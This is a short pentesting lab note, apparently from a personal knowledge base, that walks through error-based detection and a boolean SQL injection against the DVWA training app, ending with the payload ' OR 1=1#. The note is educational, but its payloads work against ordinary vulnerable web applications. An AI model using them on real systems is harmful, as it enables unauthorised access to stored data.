# 02 - Craft Exploit

#sql-injection #boolean-based #dvwa

## 2.1 -   Retrieving Hidden Data

### 2.1.1 - Vulnerability Detection

#### 2.1.1.1 - Break the Query

We will trigger a SQL error using `'` as a prefix to take advantage of unsantized user input.

![[01 - Break Query.png]]

#### 2.1.1.2 - Copying the Error Statement

First we breakdown the process step by step to figure it out how join the query to craft our final payload.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

- Understand from the developer's perspective.

```
				   ''1'''    at line 1 (SO THIS IS THE ERROR)
```

- Separate the single quotes.

```
(DELETE LEFTHANDSIDE SINGLE QUOTE) ' '1' ' ' (DELETE RIGHTHAND SIDE SINGLE QUOTE)

                                     '1' ' ' (DELETE RIGHTHAND SIDE SINGLE QUOTE)
                                     
                                     '1''
```

- Once you deleted the rest of the quotes.

```
                                     '1''    (AFTER ELIMATING THE REST WE HAVE THE REMAINING)
```

- Highlight the single quote from the right hand side of the quotes.

```
                                     '1(')'  (MARKING THE SINGLE QUOTE WITH PARENTHESES, WHICH IS BREAKING THE SQL BACKEND)
```

- Let's imagine the vulnerable PHP code snippet from the webserver backend processes it.

```php
SELECT first_name, last_name FROM users WHERE id = '$id';
```

- We include a single quote as a prefix which causes the error. So we need to escape it by commenting it out with a suffix.

```sql
SELECT first_name, last_name FROM users WHERE id = '1'';
```

#### 2.1.1.3 - Joining the Query

^a3394c

Now we need a suffix to terminate to get results. In MySQL we will terminate it with comments (`--`)  as a suffix. It will treat the rest of the snippets by interpreting it as SQL. We can leverage this craft the payload to exploit further.

`'--`

![[02 - Join Query with Double Dashes.png]]

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
```

Looks like it didn't work. Let's instead try adding the `#` as a suffix.

`'#`

![[Pentesting Phases/Post Exploitation/Shell Is The Beginning/Credential Access & Dumping/Windows/03 - Query Joined via Hashtag.png]]

![[Pentesting Phases/Post Exploitation/Shell Is The Beginning/Credential Access & Dumping/Windows/04 - Query Joined via Hashtag Valid Response.png]]

It responds normally. We can use this to exploit it. Before that let's try adding another variant to comment it out with `-- -`.

`'-- -`

![[Pentesting Phases/Post Exploitation/Shell Is The Beginning/Credential Access & Dumping/Windows/05 - Query Joined via Triple Dashes with Whitespace.png]]

![[06 - Query Joined via Triple Dashes with Whitespace Valid Response.png]]

Excellent now we can move on.

### 2.1.2 - Craft Payload

This is the syntax with a place holder of SQL payload.

`'<SQL_Payload>#`

### 2.1.3 - Exploit

- Let's retrieve the hidden data.

`' OR 1=1#`

![[07 - Boolean-Based Query Payload.png]]

![[08 - Boolean-Based Response Returned Full Data.png]]

## References

- [Web Application Pentesting – Manual SQL Injection With Error Based String Method](https://gbhackers.com/manual-sql-injection/)

- [How to Perform Manual SQL Injection While Pentesting With Single Quote Error-Based Parenthesis Method](https://gbhackers.com/manual-sql-injection-2/)

- [How to Perform Manual SQL Injection With Double Quotes Error-Based String Method](https://gbhackers.com/perform-manual-sql-injection-2/)

- [Web Application Pentesting with Manual SQL Injection – Integer Based](https://gbhackers.com/perform-manual-sql-injection/)

- [Best approach to Error-Based SQL injection](https://medium.com/@anekantsinghai/best-approach-to-error-based-sql-injection-30c73fd8fa41)